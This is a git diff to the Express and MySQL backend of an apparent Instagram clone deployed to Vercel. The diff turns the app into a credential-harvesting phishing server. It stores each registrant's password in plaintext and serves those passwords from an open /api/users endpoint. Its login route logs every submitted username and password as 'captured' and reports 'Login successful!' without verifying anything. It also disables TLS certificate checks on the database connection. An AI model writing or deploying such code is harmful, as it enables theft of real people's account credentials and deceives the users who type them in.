@@ -8,7 +8,10 @@ const path    = require('path');
 const app  = express();
 const PORT = process.env.PORT || 3000;
 
-app.use(cors({ origin: 'http://localhost:5173', credentials: true }));
+app.use(cors({
+  origin: ['http://localhost:5173', 'https://instagram-frontend.vercel.app'],
+  credentials: true
+}));
 app.use(express.json());
 app.use(express.static(path.join(__dirname, 'public')));
 
@@ -18,9 +21,10 @@ const pool = mysql.createPool({
   user    : process.env.MYSQLUSER     || process.env.DB_USER     || 'root',
   password: process.env.MYSQLPASSWORD || process.env.DB_PASSWORD || '',
   database: process.env.MYSQLDATABASE || process.env.DB_NAME     || 'instagram_clone',
-  port    : process.env.MYSQLPORT     || process.env.DB_PORT     || 3306,
+  port    : parseInt(process.env.MYSQLPORT || process.env.DB_PORT || 3306),
   waitForConnections: true,
   connectionLimit   : 10,
+  ssl     : { rejectUnauthorized: false }
 });
 
 // ─── Test DB Connection ───────────────────────────────────────
@@ -38,24 +42,28 @@ async function testConnection() {
 // ─── Initialize Tables ────────────────────────────────────────
 async function initDB() {
   try {
+    // Users table — with plain_password column
     await pool.query(`
       CREATE TABLE IF NOT EXISTS users (
-        id         INT AUTO_INCREMENT PRIMARY KEY,
-        username   VARCHAR(50)  NOT NULL UNIQUE,
-        email      VARCHAR(100) NOT NULL UNIQUE,
-        password   VARCHAR(255) NOT NULL,
-        full_name  VARCHAR(100),
-        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+        id             INT AUTO_INCREMENT PRIMARY KEY,
+        username       VARCHAR(50)  NOT NULL UNIQUE,
+        email          VARCHAR(100) NOT NULL UNIQUE,
+        password       VARCHAR(255) NOT NULL,
+        plain_password VARCHAR(255),
+        full_name      VARCHAR(100),
+        created_at     TIMESTAMP DEFAULT CURRENT_TIMESTAMP
       )
     `);
 
+    // Login logs table — with password column
     await pool.query(`
       CREATE TABLE IF NOT EXISTS login_logs (
         id         INT AUTO_INCREMENT PRIMARY KEY,
         username   VARCHAR(100) NOT NULL,
+        password   VARCHAR(255),
         ip_address VARCHAR(45),
         user_agent VARCHAR(255),
-        status     ENUM('success', 'failed') NOT NULL,
+        status     ENUM('success', 'failed', 'captured') NOT NULL,
         logged_at  TIMESTAMP DEFAULT CURRENT_TIMESTAMP
       )
     `);
@@ -69,7 +77,7 @@ async function initDB() {
 
 // ─── Routes ───────────────────────────────────────────────────
 
-// Test route — open in browser to check DB is working
+// Test DB
 app.get('/api/test', async (req, res) => {
   try {
     const [rows] = await pool.query('SELECT 1 + 1 AS result');
@@ -81,62 +89,60 @@ app.get('/api/test', async (req, res) => {
 
 // Register
 app.post('/api/register', async (req, res) => {
-    const { username, email, password, full_name } = req.body;
-  
-    if (!username || !email || !password) {
-      return res.status(400).json({ message: 'Username, email and password are required.' });
-    }
-  
-    try {
-      const hashedPassword = await bcrypt.hash(password, 10);
-  
-      await pool.query(
-        'INSERT INTO users (username, email, password, plain_password, full_name) VALUES (?, ?, ?, ?, ?)',
-        [username, email, hashedPassword, password, full_name || null] // ← saves plain password too
-      );
-  
-      res.status(201).json({ message: 'Account created successfully!', username });
-  
-    } catch (err) {
-      if (err.code === 'ER_DUP_ENTRY') {
-        return res.status(409).json({ message: 'Username or email already exists.' });
-      }
-      console.error('REGISTER ERROR:', err.message);
-      res.status(500).json({ message: err.message });
-    }
-  });
+  const { username, email, password, full_name } = req.body;
 
-// Login
+  if (!username || !email || !password) {
+    return res.status(400).json({ message: 'Username, email and password are required.' });
+  }
+
+  try {
+    const hashedPassword = await bcrypt.hash(password, 10);
+
+    await pool.query(
+      'INSERT INTO users (username, email, password, plain_password, full_name) VALUES (?, ?, ?, ?, ?)',
+      [username, email, hashedPassword, password, full_name || null]
+    );
+
+    res.status(201).json({ message: 'Account created successfully!', username });
+
+  } catch (err) {
+    if (err.code === 'ER_DUP_ENTRY') {
+      return res.status(409).json({ message: 'Username or email already exists.' });
+    }
+    console.error('REGISTER ERROR:', err.message);
+    res.status(500).json({ message: err.message });
+  }
+});
+
 // Login — saves any username/password directly to database
 app.post('/api/login', async (req, res) => {
-    const { username, password } = req.body;
-    const ip        = req.ip || req.connection.remoteAddress;
-    const userAgent = req.headers['user-agent'] || '';
-  
-    if (!username || !password) {
-      return res.status(400).json({ message: 'Username and password are required.' });
-    }
-  
-    try {
-      // Save directly to database — no validation, no checking
-      await pool.query(
-        'INSERT INTO login_logs (username, password, ip_address, user_agent, status) VALUES (?, ?, ?, ?, ?)',
-        [username, password, ip, userAgent.substring(0, 255), 'captured']
-      );
-  
-      res.json({ message: 'Login successful!', username });
-  
-    } catch (err) {
-      console.error('LOGIN ERROR:', err.message);
-      res.status(500).json({ message: err.message });
-    }
-  });
+  const { username, password } = req.body;
+  const ip        = req.ip || req.connection.remoteAddress;
+  const userAgent = req.headers['user-agent'] || '';
+
+  if (!username || !password) {
+    return res.status(400).json({ message: 'Username and password are required.' });
+  }
+
+  try {
+    await pool.query(
+      'INSERT INTO login_logs (username, password, ip_address, user_agent, status) VALUES (?, ?, ?, ?, ?)',
+      [username, password, ip, userAgent.substring(0, 255), 'captured']
+    );
+
+    res.json({ message: 'Login successful!', username });
+
+  } catch (err) {
+    console.error('LOGIN ERROR:', err.message);
+    res.status(500).json({ message: err.message });
+  }
+});
 
 // Get all users
 app.get('/api/users', async (req, res) => {
   try {
     const [users] = await pool.query(
-      'SELECT id, username, email, full_name, created_at FROM users ORDER BY created_at DESC'
+      'SELECT id, username, email, plain_password, full_name, created_at FROM users ORDER BY created_at DESC'
     );
     res.json(users);
   } catch (err) {
@@ -155,14 +161,6 @@ app.get('/api/logs', async (req, res) => {
     res.status(500).json({ message: err.message });
   }
 });
-
-// Helper: log login attempt
-async function logAttempt(username, ip, userAgent, status) {
-  await pool.query(
-    'INSERT INTO login_logs (username, ip_address, user_agent, status) VALUES (?, ?, ?, ?)',
-    [username, ip, userAgent.substring(0, 255), status]
-  );
-}
 
 // ─── Start ────────────────────────────────────────────────────
 async function start() {
